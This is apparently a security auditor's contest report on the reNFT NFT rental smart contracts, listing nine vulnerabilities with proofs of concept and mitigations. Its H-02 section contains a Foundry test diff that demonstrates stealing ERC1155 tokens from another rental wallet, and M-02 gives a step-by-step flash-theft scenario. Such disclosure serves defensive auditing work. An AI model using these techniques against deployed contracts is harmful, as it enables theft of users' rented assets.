# reNFT 

Type: CONTEST

Dates: 9 Jan 2024 - 19 Jan 2024

Collateral-free, permissionless, and highly customizable EVM NFT rentals

Code Under Review: https://github.com/code-423n4/2024-01-renft

More contest details: https://code4rena.com/audits/2024-01-renft

Rank: 5

# Findings Summary

- High : 3
- Medium : 6


|ID|Title|Severity|
|-|:-|:-:|
| [H-01](#H-01)| setFallbackHandler is not access controlled in Guard allowing renter's to steal rented assets | High |
| [H-02](#H-02)| Missing rentalWallet field in orderHash allows stealing from other rental wallets | High |
| [H-03](#H-03)| Partial order's can lead to loss of rented asset | High |
| [M-01](#M-01)| Hook tokens allow renter's to gain access to the rented asset before the hook has been setup with onStart | Medium |
| [M-02](#M-02)| Incorrect ordering for deletion allows to flash steal rented NFT's | Medium |
| [M-03](#M-03)| OrderMetadata hash doesn't include all the component fields | Medium |
| [M-04](#M-04)| Missing order identifier in RentalPayload allows for server side signature reuse | Medium |
| [M-05](#M-05)| RentalAsset's safeTransferFrom callback allows contract order creators to delay PAY order payments | Medium |
| [M-06](#M-06)| Blacklisted renter will result in lost rental asset for the lender | Medium |


# Detailed Findings

# <a id='H-01'></a>H-01 setFallbackHandler is not access controlled in Guard allowing renter's to steal rented assets

## Proof of Concept
The implemented guard doesn't block the `setFallbackHandler` function call on the safe. 

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195-L293

This allows the owner to set the rented asset as the `fallbackHandler`. Following this, a call to the safe with calldata corresponding to the rented asset's transfer function will allow the attacker to transfer the asset to any address.

### POC Test
https://gist.github.com/10xhash/56ef3505b5ccb98d49283ae96ec92805

## Impact
Renter's can steal rented assets

## Tools Used
Manual Review

## Recommended Mitigation Steps
Block `setFallbackHandler` in the guard

# <a id='H-02'></a>H-02 Missing rentalWallet field in orderHash allows stealing from other rental wallets

## Proof of Concept
The stored rental order hash doesn't contain the rental wallet.

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L181-L194
```solidity
    function _deriveRentalOrderHash(
        RentalOrder memory order
    ) internal view returns (bytes32) {
        
        .....

        /*
        
        struct RentalOrder {
    bytes32 seaportOrderHash;
    Item[] items;
    Hook[] hooks;
    OrderType orderType;
    address lender;
    address renter;
    address rentalWallet;
    uint256 startTimestamp;
    uint256 endTimestamp;
        }
        
        */

        // @audit missing order.rentalWallet
        return
            keccak256(
                abi.encode(
                    _RENTAL_ORDER_TYPEHASH,
                    order.seaportOrderHash,
                    keccak256(abi.encodePacked(itemHashes)),
                    keccak256(abi.encodePacked(hookHashes)),
                    order.orderType,
                    order.lender,
                    order.renter,
                    order.startTimestamp,
                    order.endTimestamp
                )
            );
    }
```

Since an ERC1155 token can be present in multiple rental wallets, this makes it possible for an attacker to withdraw the rented token from a different rental wallet when stopping a rental order. 

### POC Test
Apply the following diff and run `forge test --mt testHash_StealFromOtherRentalWallet`

Withdrawing from another rental wallet test
```diff
diff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol
index 3d19d3c..3f646f3 100644
--- a/test/integration/StopRent.t.sol
+++ b/test/integration/StopRent.t.sol
@@ -6,6 +6,8 @@ import {Order} from "@seaport-types/lib/ConsiderationStructs.sol";
 import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
 
 import {BaseTest} from "@test/BaseTest.sol";
+import {Errors} from "@src/libraries/Errors.sol";
+import {console} from "forge-std/Test.sol";
 
 contract TestStopRent is BaseTest {
     function test_StopRent_BaseOrder() public {
@@ -65,6 +67,97 @@ contract TestStopRent is BaseTest {
         assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));
     }
 
+        function testHash_StealFromOtherRentalWallet() public {
+        // alice lends erc1155
+        createOrder({
+            offerer: alice,
+            orderType: OrderType.BASE,
+            erc721Offers: 0,
+            erc1155Offers: 1,
+            erc20Offers: 0,
+            erc721Considerations: 0,
+            erc1155Considerations: 0,
+            erc20Considerations: 1
+        });
+
+        // finalize the order creation
+        (
+            Order memory orderAliceBob,
+            bytes32 orderHashAliceBob,
+            OrderMetadata memory metadataAliceBob
+        ) = finalizeOrder();
+
+        // bob rents it
+        createOrderFulfillment({
+            _fulfiller: bob,
+            order: orderAliceBob,
+            orderHash: orderHashAliceBob,
+            metadata: metadataAliceBob
+        });
+
+        // finalize the base order fulfillment
+        RentalOrder memory rentalOrderAliceBob = finalizeBaseOrderFulfillment();
+
+        // carol creates order for the same asset 
+        createOrder({
+            offerer: carol,
+            orderType: OrderType.BASE,
+            erc721Offers: 0,
+            erc1155Offers: 1,
+            erc20Offers: 0,
+            erc721Considerations: 0,
+            erc1155Considerations: 0,
+            erc20Considerations: 1
+        });
+
+        
+        // finalize the order creation
+ 
+(
+            Order memory orderCarolDan,
+            bytes32 orderHashCarolDan,
+            OrderMetadata memory metadataCarolDan
+        ) = finalizeOrder();
+
+        // dan rents it
+        createOrderFulfillment({
+            _fulfiller: dan,
+            order: orderCarolDan,
+            orderHash: orderHashCarolDan,
+            metadata: metadataCarolDan
+        });
+
+
+        // finalize the base order fulfillment
+        RentalOrder memory rentalOrderCarolDan = finalizeBaseOrderFulfillment();
+
+        // speed up in time past the rental expiration
+        vm.warp(block.timestamp + 800);
+
+        // stop the rental order
+        address attacker = address(0xa11ac7e4);
+        vm.prank(attacker);
+
+        // when stopping the rental order of alice-bob, attacker passes in the rental wallet address of dan. this will clear the alice-bob order but take the funds from dan's rental wallet
+        rentalOrderAliceBob.rentalWallet = address(dan.safe);
+        stop.stopRent(rentalOrderAliceBob);
+
+        // alice bob order is cancelled
+        assertEq(STORE.orders(orderHashAliceBob), false);
+
+        // but erc1155 is actually moved from dans wallet
+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[0]), 0), true);
+        assertEq(erc1155s[0].balanceOf(address(bob.safe), 0), uint256(100));
+
+        assertEq(STORE.isRentedOut(address(dan.safe), address(erc1155s[0]), 0), false);
+        assertEq(erc1155s[0].balanceOf(address(dan.safe), 0), uint256(0));
+
+       // attempt to stop the carol-dan order reverts since the 
+       vm.expectRevert(Errors.StopPolicy_ReclaimFailed.selector);
+       stop.stopRent(rentalOrderCarolDan);
+       
+    }
+
     function test_StopRent_PayOrder_InFull_StoppedByLender() public {
         // create a PAY order
         createOrder({
```

By deafult, `createOrder()` used in test-suite updates the tokenId. Avoiding this to create order for the same token so that stealing can be shown
```diff
diff --git a/test/fixtures/engine/OrderCreator.sol b/test/fixtures/engine/OrderCreator.sol
index 6cf6050..9058b81 100644
--- a/test/fixtures/engine/OrderCreator.sol
+++ b/test/fixtures/engine/OrderCreator.sol
@@ -177,10 +177,11 @@ contract OrderCreator is BaseProtocol {
             );
 
             // mint an erc1155 to the offerer
-            erc1155s[i].mint(orderToCreate.offerer.addr, 100);
+            //erc1155s[i].mint(orderToCreate.offerer.addr, 100);
+            erc1155s[i].mintTokenId(usedOfferERC1155s[i],orderToCreate.offerer.addr, 100);
 
             // update the used token so it cannot be used again in the same test
-            usedOfferERC1155s[i]++;
+            // usedOfferERC1155s[i]++;
         }
 
         // generate the ERC20 offer items
```

Adding tokenwise minting for easier testing
```diff            
diff --git a/test/mocks/tokens/standard/MockERC1155.sol b/test/mocks/tokens/standard/MockERC1155.sol
index a83cc76..4edc15a 100644
--- a/test/mocks/tokens/standard/MockERC1155.sol
+++ b/test/mocks/tokens/standard/MockERC1155.sol
@@ -22,6 +22,10 @@ contract MockERC1155 is ERC1155 {
         _tokenIds++;
     }
 
+        function mintTokenId(uint tokenId,address to, uint256 amount) public {
+        _mint(to, tokenId, amount, "");
+    }
+
     function mintBatch(address to, uint256 amount, uint256 numberOfIds) public {
         uint256[] memory ids = new uint256[](numberOfIds);
         uint256[] memory amounts = new uint256[](numberOfIds);
```

## Impact
Attacker can steal rental assets from other rental wallets

## Tools Used
Manual Review

## Recommended Mitigation Steps
Include rentalWallet in the hash

# <a id='H-03'></a>H-03 Partial order's can lead to loss of rented asset

## Proof of Concept
The addRentals functions adds a rental order without checking if the same orderHash is currently active

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol#L189-L194
```solidity
    function addRentals(
        bytes32 orderHash,
        RentalAssetUpdate[] memory rentalAssetUpdates
    ) external onlyByProxy permissioned {
       
        orders[orderHash] = true;
```

An attacker can make use of this to fill a partial order in half twice in the same block to produce the same orderhash. This will result in only half of the rented asset being take outable by the lender since the first call to `stopRent` will clear the `orderHash` from the order's mapping 

### POC Test
https://gist.github.com/10xhash/4cef50612dfcb290bf232567769dfbae

## Impact
Lost rental assets for the lender and forever possession of the rented asset for the attacker on partial orders

## Tools Used
Manual Review

## Recommended Mitigation Steps
If the `orderHash` already exist, revert

# <a id='M-01'></a>M-01 Hook tokens allow renter's to gain access to the rented asset before the hook has been setup with onStart

## Proof of Concept
Some hooks may be configured by invoking the `onStart` method inside the `validateOrder` callback from Seaport

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L495-L503
```solidity
            try
                IHook(target).onStart(
                    rentalWallet,
                    offer.token,
                    offer.identifier,
                    offer.amount,
                    hooks[i].extraData
                )
``` 

When filling a restricted order(orders with zones) in seaport:
1. The zone is called after the associated assets have been transferred
2. The offer items are transferred before the consideration items[docs](https://docs.opensea.io/reference/seaport-overview#fulfill-order)
 
This means that the rentalWallet will be having the rental asset before the consideration token is transferred from the fulfiller.
ERC777 tokens allow callbacks to be setup when tokens are transferred from an account. This allows an attacker to use the rented asset before it has configured correctly.

### POC Test
https://gist.github.com/10xhash/da97ccf3ac90a130a879c1a7004c3521

## Impact
Rental asset can be used before it's hook have been setup with onStart method in case of ERC777 tokens

## Tools Used
Manual Review

## Recommended Mitigation Steps
Inform about this issue for hook tokens or always configure hooks in such a manner that `onStart` provides more leniency while default mode is more restrictive.

# <a id='M-02'></a>M-02 Incorrect ordering for deletion allows to flash steal rented NFT's

## Proof of Concept
When stopping a rental,the rented asset (ERC721/ERC1155) is transferred before the actual existance of the order is checked.

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293-L302
```solidity
        // @audit rented assets are transferred here
        _reclaimRentedItems(order);

        ESCRW.settlePayment(order);

        // @audit this is where the existance of the order is actually verified
        STORE.removeRentals(
            _deriveRentalOrderHash(order),
            _convertToStatic(rentalAssetUpdates)
        );
```

Since ERC721/ERC1155 transfers invoke the onReceived functions in case of a contract receiver, it allows an attacker to create a rental order after stopping it first. This gives the attacker unrestricted access to the rented NFT.

### Example Scenario

1. Attacker rents a restricted NFT N.
2. Attacker calls stopRent with a non-existing PAY order(pay order's allow to stop the rent at the same block as creation) keeping the offer item as NFT N and creator as an attacker controlled contract.
3. Since order existance check is done only at last, NFT N is transferred to the attacker's contract.
4. Attacker performs anything he wants to do with the NFT bypassing any restrictions imposed.
5. Attacker creates the order and fills it in seaport (attacker can obtain the server signature earlier itself or replay the signature of a similar order). This will populate the orderHash in the existing orders mapping.
6. The initial execution inside stopRent continues without reverting since the order is now actually a valid one.


### POC Test
https://gist.github.com/10xhash/a6eb9552314900483a1cffe91243a169

## Impact
User's can flash steal NFT's circumventing any restrictions imposed on the NFT

## Tools Used
Manual Review

## Recommended Mitigation Steps
Check for the order existance initially itself in the stopRent function

# <a id='M-03'></a>M-03 OrderMetadata hash doesn't include all the component fields

## Proof of Concept
The orderMetadata hash doesn't include `orderType` and `emittedExtraData` fields of OrderMetadata.

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L181-L194
```solidity
    function _deriveOrderMetadataHash(
        OrderMetadata memory metadata
    ) internal view returns (bytes32) {
        
        .......

        // @audit missing fields
        // Derive and return the metadata hash as specified by EIP-712.
        return
            keccak256(
                abi.encode(
                    _ORDER_METADATA_TYPEHASH,
                    metadata.rentDuration,
                    keccak256(abi.encodePacked(hookHashes))
                )
            );

        /*
        struct OrderMetadata {
            // Type of order being created.
            OrderType orderType;
            // Duration of the rental in seconds.
            uint256 rentDuration;
            // Hooks that will act as middleware for the items in the order.
            Hook[] hooks;
            // Any extra data to be emitted upon order fulfillment.
            bytes emittedExtraData;
        }
        */            
    }
```

- This deviates from the EIP712 specification. This hash is used to compare against the `zoneHash` provided by the order creator which if follows EIP712 will result in a mismatch and cause revert.
- The order emitting event can be changed by the renter which may be setup by the lender to activate some actions which can be bypassed.

## Impact
- Reverts on order fulfillment due to signature mismatch if the creator correctly follows EIP712
- Bypassing of any event actions in case that was setup by the order creator

## Tools Used
Manual Review

## Recommended Mitigation Steps
Include the missing fields in the hash.

# <a id='M-04'></a>M-04 Missing order identifier in RentalPayload allows for server side signature reuse

## Proof of Concept
The fields of RentPayload hash currently doesn't include any parameter to uniquely identify an order. This server signs this hash inorder to allow a fill.

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalStructs.sol#L154-L159
```solidity
struct RentPayload {
    OrderFulfillment fulfillment;
    OrderMetadata metadata;
    uint256 expiration;
    address intendedFulfiller;
}

struct OrderMetadata {
    OrderType orderType;
    uint256 rentDuration;
    Hook[] hooks;
    bytes emittedExtraData;
}
```

https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L737-L768
```solidity
        (RentPayload memory payload, bytes memory signature) = abi.decode(
            zoneParams.extraData,
            (RentPayload, bytes)
        );

        ......

        address signer = _recoverSignerFromPayload(
            _deriveRentPayloadHash(payload),
            signature
        );

        if (!kernel.hasRole(signer, toRole("CREATE_SIGNER"))) {
            revert Errors.CreatePolicy_UnauthorizedCreatePolicySigner();
        }
```

This allows the signature obtained from the server to be replayed across multiple order fulfillments. The team plans to reject signing for cancellation requested orders, but the above issue would bypass it.  

## Impact
Replay of server side RentalPayload signature across multiple orders 

## Tools Used
Manual Review

## Recommended Mitigation Steps
Include `orderHash` of the attempted filling order in the payload

# <a id='M-05'></a>M-05 RentalAsset's safeTransferFrom callback allows contract order creators to delay PAY order payments

## Proof of Concept
In case of PAY order's the payment is held in escrow and released only after the pay order has been stopped. When stopping a pay order, the rented ERC721/ERC1155 is transferred back to the lender using the .safeTransferFrom method. In case the order creator is a contract (possible since seaport considers EIP-1271), it has the ability to reject such transfers. 

https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/SignatureVerification.sol#L164-L165
```solidity
            // If the signature was not verified with ecrecover, try EIP1271.
            if iszero(success) {
```

This will make the order not stoppable delaying the lender's payment until the renter wishes.

### POC Test
https://gist.github.com/10xhash/45159f32123d74f4fa71a44ebd8c93a2

## Impact
The payment of renter's can be delayed by the lender

## Tools Used
Manual Review

## Recommended Mitigation Steps
Keep an internal accounting mechanism from which user's can pull instead of directly transferring to the creator.

# <a id='M-06'></a>M-06 Blacklisted renter will result in lost rental asset for the lender

## Proof of Concept
For PAY orders, the payment held in escrow should be made to the renter when stopping the rent.
In case this payment fails, the entire call to `stopRent` will fail which includes returning back the rented assets to the lender.  
If any payment token is a blacklistable one(like USDC) a blacklisted user can fulfill this order which will result in the lender loosing their rented asset. This can also happen if a currently clean renter gets blacklisted in future.

## Impact
Blacklisted renter will result in lost rental asset for the lender

## Tools Used
Manual Review

## Recommended Mitigation Steps
Maintain internal accounting and let the user's pull their payments out instead of direct transfer.